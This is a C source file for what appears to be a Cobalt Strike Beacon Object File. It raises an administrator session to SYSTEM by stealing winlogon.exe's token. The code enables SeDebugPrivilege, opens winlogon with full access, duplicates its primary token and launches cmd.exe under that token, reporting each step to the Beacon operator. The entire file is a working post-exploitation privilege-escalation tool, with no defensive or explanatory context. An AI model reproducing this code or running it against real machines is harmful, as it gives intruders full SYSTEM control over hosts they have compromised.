
// get system by duplicating winlogon's token

#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>
#include "beacon.h"


WINBASEAPI        DWORD	     WINAPI KERNEL32$GetLastError(VOID);
WINBASEAPI        BOOL	     WINAPI KERNEL32$CloseHandle(HANDLE);
WINBASEAPI	  HANDLE     WINAPI KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT   BOOL	     WINAPI KERNEL32$Process32Next(HANDLE, void*);
DECLSPEC_IMPORT   BOOL	     WINAPI KERNEL32$Process32First(HANDLE, void*);
WINBASEAPI        HANDLE     WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT   HANDLE     WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
WINADVAPI         BOOL       WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
WINADVAPI	  BOOL	     WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
WINADVAPI         BOOL       WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
WINADVAPI         BOOL       WINAPI ADVAPI32$DuplicateTokenEx(HANDLE , DWORD ,LPSECURITY_ATTRIBUTES , SECURITY_IMPERSONATION_LEVEL,TOKEN_TYPE,PHANDLE );
WINADVAPI _Must_inspect_result_  BOOL WINAPI ADVAPI32$CreateProcessWithTokenW(HANDLE , DWORD ,LPCWSTR ,LPWSTR ,DWORD ,LPVOID ,LPCWSTR ,LPSTARTUPINFOW ,LPPROCESS_INFORMATION );


BOOL EnableSeDebug(void) {

	HANDLE hToken = NULL;
	TOKEN_PRIVILEGES TokenPrivileges = { 0 };

	if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken)) {
		return FALSE;
	}
	TokenPrivileges.PrivilegeCount = 1;
	TokenPrivileges.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;

	LPWSTR lpwPriv = L"SeDebugPrivilege";

	if (!ADVAPI32$LookupPrivilegeValueW(NULL, (LPCWSTR)lpwPriv, &TokenPrivileges.Privileges[0].Luid)) {
		KERNEL32$CloseHandle(hToken);
		return FALSE;
	}

	if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
		KERNEL32$CloseHandle(hToken);
		return FALSE;
	}

	KERNEL32$CloseHandle(hToken);

	return TRUE;
}

int GetProcId(void) {

	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	int pid = -1;
	if (KERNEL32$Process32First(snapshot, &entry) == TRUE) {
		while (KERNEL32$Process32Next(snapshot, &entry) == TRUE) {
			if (mycmpi(entry.szExeFile, "winlogon.exe")) {
				pid = entry.th32ProcessID;
				break;
			}
		}
	}
	KERNEL32$CloseHandle(snapshot);

	return pid;
}



void go(char* argc, int len) {

  // Check if Elevated
  if (!BeaconIsAdmin()) {

		BeaconPrintf(CALLBACK_ERROR, "Sorry, You are not Admin !\n");
		return;
	}
  
  
  // Enable debug privileges
	EnableSeDebug();

	DWORD LastError;
	HANDLE pToken;

	
	int pid = GetProcId();

	if (pid < 0) {
		BeaconPrintf(CALLBACK_ERROR, "Could not find winlogon pid : 0x%lx\n", KERNEL32$GetLastError());

	}

	// Open up a handle to WinLogon
	HANDLE processHandle = KERNEL32$OpenProcess(
		PROCESS_ALL_ACCESS,
		FALSE,
		(int)pid
	);

	if (processHandle == INVALID_HANDLE_VALUE)
	{
		BeaconPrintf(CALLBACK_ERROR, "Error! Unable to open a handle to the process. Error: 0x%lx\n", KERNEL32$GetLastError());
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened a Handle to WinLogon \n");
	}


	// get accesstoken of the system process
	BOOL token = ADVAPI32$OpenProcessToken(processHandle, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &pToken);

	if (!token) {
		BeaconPrintf(CALLBACK_ERROR, "[*] Obtaining AccessToken Failed 0x%lx\n", KERNEL32$GetLastError());
	}

	// Create a duplicate token to use for impersonation
	SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation;
	TOKEN_TYPE tokenType = TokenPrimary;
	HANDLE dupToken;

  
	BOOL dToken = ADVAPI32$DuplicateTokenEx(pToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &dupToken);

	if (!dToken) {
		BeaconPrintf(CALLBACK_ERROR, "[*] Token Duplication Failed 0x%lx\n", KERNEL32$GetLastError());
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Impersonation WinLogon for SYSTEM !\n");
	}

	// spawn cmd with duplicated system token
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi = {0};

	
	BOOL ret = ADVAPI32$CreateProcessWithTokenW(dupToken, LOGON_NETCREDENTIALS_ONLY, L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

	if (!ret) {
		BeaconPrintf(CALLBACK_OUTPUT, "[*] Createprocess  Failed 0x%lx\n", KERNEL32$GetLastError());
	}


	// cleanup
	KERNEL32$CloseHandle(dupToken);
	KERNEL32$CloseHandle(pToken);
	KERNEL32$CloseHandle(processHandle);

}
